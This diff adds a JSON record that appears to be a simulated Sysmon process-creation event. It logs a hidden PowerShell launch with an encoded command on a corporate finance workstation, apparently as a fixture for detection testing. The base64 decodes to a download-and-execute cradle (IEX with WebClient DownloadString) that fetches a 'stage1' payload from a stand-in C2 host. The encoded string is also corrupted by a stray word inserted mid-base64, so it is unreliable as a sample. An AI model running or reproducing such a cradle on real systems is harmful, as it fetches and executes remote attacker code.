@@ -1,0 +1,19 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-09 14:15:20.123",
+  "ProcessGuid": "{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}",
+  "ProcessId": 5412,
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AYQBwAHQALQBzA radioAG0AdQBsAGEAdABlAGQALgBvAHIAZwAvAHMAdABhAGcAZQAxACIAKQAKAA==",
+  "CurrentDirectory": "C:\\Users\\victim_user\\Desktop\\",
+  "User": "CORP\\victim_user",
+  "LogonGuid": "{B2C3D4E5-F6A1-8901-2345-6789ABCDEF01}",
+  "LogonId": "0x4a123",
+  "IntegrityLevel": "Medium",
+  "Hashes": "SHA256=A697368B25A0B7EC9AEBEE3FECE92CE9D0E76F4B84BBDA5701FEA28A6635A33D,MD5=852D67F20D304C828FA44E50E730C66F",
+  "ParentProcessGuid": "{00112233-4455-6677-8899-AABBCCDDEEFF}",
+  "ParentProcessId": 3204,
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+  "Computer": "CORP-FIN-WS01"
+}
